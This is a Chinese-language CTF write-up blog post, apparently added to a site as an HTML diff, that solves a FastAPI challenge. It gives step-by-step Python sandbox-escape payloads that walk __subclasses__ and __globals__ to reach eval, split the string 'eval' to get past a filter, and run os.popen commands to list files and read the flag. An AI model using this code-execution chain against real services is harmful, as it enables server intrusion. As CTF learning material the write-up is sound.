@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html>
+  <!-- Html Head Tag-->
+  <head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="">
+  <meta name="author" content="moMaxX">
+  <!-- Open Graph Data -->
+  <meta property="og:title" content="ctf-python题记"/>
+  <meta property="og:description" content="" />
+  <meta property="og:site_name" content="Momax&#39;s blog"/>
+  <meta property="og:type" content="article" />
+  <meta property="og:image" content="http://moMaxX.github.io"/>
+  
+    <link rel="alternate" href="/atom.xml" title="Momax&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+
+  <!-- Site Title -->
+  <title>Momax's blog</title>
+
+  <!-- Bootstrap CSS -->
+  
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+
+  <!-- Custom CSS -->
+  
+  
+<link rel="stylesheet" href="/css/style.light.css">
+
+
+  <!-- Google Analytics -->
+  
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+  <body>
+  	<!-- 雪花特效 --> 
+  
+    <!-- Page Header -->
+
+
+<header class="site-header header-background" style="background-image: url(/img/default-banner-light.jpg)">
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="page-title with-background-image">
+          <p class="title">ctf-python题记</p>
+          <p class="subtitle"></p>
+        </div>
+        <div class="site-menu with-background-image">
+          <ul>
+            
+              <li>
+                <a href="/">
+                  
+                  Home
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/archives">
+                  
+                  Archives
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="https://github.com/MomaxX" target="_blank" rel="noopener">
+                  
+                  Github
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="mailto:194038819@qq.com">
+                  
+                  Email
+                  
+                </a>
+              </li>
+            
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</header>
+
+<article>
+  <div class="container typo">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="post-info text-muted">
+          
+            <!-- Author -->
+            <span class="author info">By moMaxX</span>
+          
+          <!-- Date -->
+          <span class="date-time info">On
+            <span class="date">2020-11-18</span>
+            <span class="time">23:08:36</span>
+          </span>
+          
+        </div>
+        <!-- Tags -->
+        
+        <!-- Post Main Content -->
+        <div class="post-content">
+          <p>@<a href="python">TOC</a></p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>上次做ctfshow的1024挑战杯，发现web题都没见过的题型，因此没有全部记录下来，这次特意对其中一个题进行一个较为详细的记录</p>
+<h1 id="fastapi"><a href="#fastapi" class="headerlink" title="fastapi"></a>fastapi</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
+<p>fastapi是高性能的web框架。他的主要特点是：</p>
+<ul>
+<li>快速编码</li>
+<li>减少人为bug</li>
+<li>直观</li>
+<li>简易</li>
+<li>具有交互式文档</li>
+<li>基于API的开放标准（并与之完全兼容）：OpenAPI（以前称为Swagger）和JSON Schema。</li>
+</ul>
+</blockquote>
+<h2 id="fastapi安装使用"><a href="#fastapi安装使用" class="headerlink" title="fastapi安装使用"></a>fastapi安装使用</h2><p><a href="https://blog.csdn.net/weixin_40156487/article/details/101446937" target="_blank" rel="noopener">大师傅博客</a><br>具体的就不多进行赘述了，师傅博客里写的挺好的，这次就是简单的了解半只脚跨进来，以后遇到了难处再进行补充说明。</p>
+<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>打开题目<br><img src="https://img-blog.csdnimg.cn/20201115201404897.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="打开题目"><br>发现提示<code>fastapi</code>，然后在这个的官网上找到了，<code>对于fastapi，网页会存在自述文档文件 /docs</code>，打开之后发现<br><img src="https://img-blog.csdnimg.cn/20201115201852647.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="打开docs之后"><br>发现了一个端口，需要<code>post</code>参数<code>q</code>来执行，所以看大佬的博客尝试post了一个python有返回值的函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"res"</span>:<span class="string">"yoyo"</span>,<span class="string">"err"</span>:flase&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/2020111520205745.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="返回"><br>所以在这里可以尝试进行<code>ssti</code>，具体思路，在上一篇已经说过了一些python里的方法，所以思路就是进行逐个尝试，最后进行搜索，读取指定文件的内容来获取flag<br>对于这些方法</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__class__  返回类型所属的对象</span><br><span class="line">__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__base__   返回该对象所继承的基类</span><br><span class="line">// __base__和__mro__都是用来寻找基类的</span><br><span class="line"></span><br><span class="line">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure>
+<p>所以首先构造payload：<code>q=str(&#39;&#39;.__class__)</code>得到<br><img src="https://img-blog.csdnimg.cn/20201115202354972.png#pic_center" alt="第一次"><br>接着依次构造</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">q=str(<span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>])</span><br><span class="line">&gt;&gt;&#123;<span class="string">"res"</span>:<span class="string">"&lt;class 'object'&gt;"</span>,<span class="string">"err"</span>:false&#125;</span><br><span class="line">q=str(<span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">189</span>])</span><br><span class="line">&gt;&gt;&#123;<span class="string">"res"</span>:<span class="string">"&lt;class 'warnings.catch_warnings'&gt;"</span>,<span class="string">"err"</span>:false&#125;</span><br><span class="line">q=str(<span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">189</span>].__init__)</span><br><span class="line">&gt;&gt;&#123;<span class="string">"res"</span>:<span class="string">"&lt;function catch_warnings.__init__ at 0x7fad291ef5f0&gt;"</span>,<span class="string">"err"</span>:false&#125;</span><br><span class="line">q=str(<span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">189</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'ev'</span>+<span class="string">'al'</span>])//注意这里存在了一个过滤，过滤掉了eval，所以采用python里的字符拼接进行绕过</span><br><span class="line">&gt;&gt;&#123;<span class="string">"res"</span>:<span class="string">"&lt;built-in function eval&gt;"</span>,<span class="string">"err"</span>:false&#125;</span><br><span class="line">q=str(<span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">189</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'ev'</span>+<span class="string">'al'</span>](<span class="string">'__im'</span>+<span class="string">'port__("os").po'</span>+<span class="string">'pen("whoami").read()'</span>))</span><br><span class="line">&gt;&gt;&#123;<span class="string">"res"</span>:<span class="string">"root\n"</span>,<span class="string">"err"</span>:false&#125;</span><br><span class="line">//到了这里，基本上就做出来了，可以进行查找等操作了</span><br><span class="line">q=str(<span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">189</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'ev'</span>+<span class="string">'al'</span>](<span class="string">'__im'</span>+<span class="string">'port__("os").po'</span>+<span class="string">'pen("ls").read()'</span>))//这里同上，进行了过滤，采用字符拼接进行绕过</span><br><span class="line">&gt;&gt;&#123;<span class="string">"res"</span>:<span class="string">"main.py\nstart.sh\n"</span>,<span class="string">"err"</span>:false&#125;</span><br><span class="line">q=str(<span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">189</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'ev'</span>+<span class="string">'al'</span>](<span class="string">'__im'</span>+<span class="string">'port__("os").po'</span>+<span class="string">'pen("grep flag main.py").read()'</span>))</span><br><span class="line">&gt;&gt;&#123;<span class="string">"res"</span>:<span class="string">"        hint = \"flag is in /mnt/f1a9,try to read it\"\n"</span>,<span class="string">"err"</span>:false&#125;</span><br><span class="line">q=str(<span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">189</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'ev'</span>+<span class="string">'al'</span>](<span class="string">'__im'</span>+<span class="string">'port__("os").po'</span>+<span class="string">'pen("cat /mnt/f1a9").read()'</span>))</span><br><span class="line">&gt;&gt;&#123;<span class="string">"res"</span>:<span class="string">"flag&#123;787c8b2b-da0d-457e-b7a5-04f1acfebceb&#125;\n"</span>,<span class="string">"err"</span>:false&#125;</span><br></pre></td></tr></table></figure>
+<p>得到flag。</p>
+<h2 id="做题过程的payload部分解析"><a href="#做题过程的payload部分解析" class="headerlink" title="做题过程的payload部分解析"></a>做题过程的payload部分解析</h2><p>对于上面的一串子payload，有的已经说明过了，对于一些没说明过的，在这里进行一下简单的说明，防止以后自己忘了。<code>【手动滑稽】</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print(globals()) <span class="comment"># globals 函数返回一个全局变量的字典，包括所有导入的变量。</span></span><br><span class="line">os.popen()//用于从一个命令打开一个管道。在我理解就是，执行一些系统命令，比如ls cat 等</span><br><span class="line">grep //对于这个就不用多说了吧，Linux命令，用于查找某些符合条件的字符串</span><br></pre></td></tr></table></figure>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这一篇就是一点简单的记录，没办法与那些大师傅们的博客比，就是为了自己现在学习，怕忘记了。</p>
+
+        </div>
+      </div>
+    </div>
+  </div>
+</article>
+
+
+
+    <!-- Footer -->
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <p class="copyright text-muted">
+          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
+          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
+        <p class="copyright text-muted">
+          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+    <!-- After Footer Scripts -->
+
+<script src="/js/highlight.pack.js"></script>
+
+<script>
+  document.addEventListener("DOMContentLoaded", function(event) {
+    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
+    codeBlocks.forEach(function(block, index) {
+      hljs.highlightBlock(block);
+    });
+  });
+</script>
+
+  </body>
+</html>
+
